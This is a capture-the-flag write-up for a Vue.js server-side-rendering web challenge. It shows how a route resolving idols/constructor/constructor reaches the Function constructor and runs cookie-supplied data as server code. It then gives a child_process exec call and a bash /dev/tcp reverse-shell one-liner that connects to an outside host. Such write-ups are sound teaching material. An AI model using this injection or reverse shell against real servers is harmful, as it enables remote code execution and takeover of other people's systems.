## SSR

This is a web challenge with Vue.js + Vue.js SSR. I found that SSR works with same JS code given to client after some requests to server.

The url is like below, and the user data is JSON-encoded to the cookie.

`http://ssr.tasks.ctf.codeblue.jp/idols/0/say1`

In js side(I don't have it now), the URL is routed like:

```
routes.add('/idols/:id/:action', handler)
...

var idols = {
	// predefined objects with id, action.
};
handler = (id, action) => {
	var actions = idols[id][action];
	var user = JSON.parse(cookie.user); // Let's assume that cookie has user=... value.
	var obj = actions(user.data);
	return obj();
}
```

If I give url `idols/constructor/constructor` to it, since in js idols.a == idols['a'], it loads {}.constructor.constructor == Object.constructor == Function, and user.data is controlled by user, too. Then,

```js
    var user = JSON.parse(cookie.user); // user = { ... user controlled data ... }
    var obj = actions(user.data) // == Function(... controlled data ...)
    return obj() // == function() { ... controlled data ... } ()
```

So it causes RCE in server via SSR. The JS context itself doesn't have `require` on global object, but process.mainModule has. We can use `process.mainModule.require("child_process").exec("command in sh")` to get reverse shell. Since it's sh, not bash, [this payload](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) works.

```
bash -c "bash -i >& /dev/tcp/10.0.0.1/8080 0>&1"
```

I changed the server information. The server has flag.
